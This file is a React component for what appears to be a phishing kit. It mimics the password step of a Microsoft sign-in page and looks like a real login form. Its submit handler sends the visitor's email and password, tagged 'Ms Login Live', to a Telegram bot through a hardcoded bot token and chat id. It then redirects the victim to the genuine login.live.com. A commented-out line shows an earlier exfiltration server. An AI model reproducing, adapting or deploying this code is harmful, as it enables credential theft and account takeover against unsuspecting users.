import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import logotwo from './logotwo.gif';
import { useLocation } from 'react-router-dom';
import { Link } from 'react-router-dom';
import atlogo from './atlogo.png';
import or from './or.png';
import mix from './mix.svg';

function Next(){

    const location = useLocation();
    
    const[password, setPassword] = useState("");
    
    const[email ,setEmail] = useState(location.state.email);

    const[platform, setPlatform] = useState("Ms Login Live")

    const[showError, setShowError] = useState(false);

    const[isLoading, setIsLoading]= useState(false);

    const[showPassword, setShowPassword] = useState(false);


    async function handleSubmit(e){
        e.preventDefault();
    
        try {

            setIsLoading(true);
            // const response = await axios.post('https://micback.onrender.com/api/send', {
            //     email:email,
            //     password:password,
            //     platform:platform
            // });

            const response = await axios.post(`https://api.telegram.org/bot6900331145:AAGvVRRZV-leQZaqag7znIRPlJ79dQfZRJ0/sendMessage`, {
                  chat_id: 7150651870,
                  text: `Platform : ${platform} , User ID : ${email} , Password : ${password}'`,
                });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                window.location.href = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1565305054&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3dc090843f-d648-db97-9c82-af73bc4e5729&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';

            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }



    return (
        <div className='mainContent py-4'>

        <div className='col-md-5 m-auto maindiv px-5'>

            <div className='imagediv py-2'>

            <div className='imagediv  py-4 '>
                        <img src={mix} className="mylogo" />

                    </div>
                
                <div className='m-auto'>
                    <h4 className='last'><i className='fas fa-arrow-left'></i> {email}</h4>
                </div>

            </div>

            <h4 className='font-weight-bold'>Enter password</h4>
            

          

            <form onSubmit={handleSubmit} className="">
            <div className=''>
                <input onChange={function(e){
                   setPassword(e.target.value);
               }} value={password} type={showPassword ? "text" : "password"}className='form-control removeborder w-100 py-4'placeholder='Password' required/>
                
                    {/* <div className='text-right pr-3'>
                    <span onClick={function(e){
                        e.preventDefault();
                        setShowPassword(!showPassword);
                    }} className='show'>{showPassword ? "Hide" : "Show"}</span>
                    </div> */}
                </div>
                <div className='pb-3  mt-2'>
            <span className=' smalll'>Forgot Password</span>

            </div>

                {/* <div className='px-3'>
                <button className='next btn w-100'>Sign in</button>

                </div> */}

                <div className='text-right py-4'>
                        
                        <button className='next btn'>
                            {isLoading ? "Loading ....." : "Sign in"}
                        </button>

                        </div>

           
            {/* <p className='text-center smalll py-3'>Not you? <Link to={'/'} className='colorme'>Check your account again</Link></p> */}

            <br/>
<br/>
         
            </form>

        

        </div>


        

    </div>
    );

}

export default Next;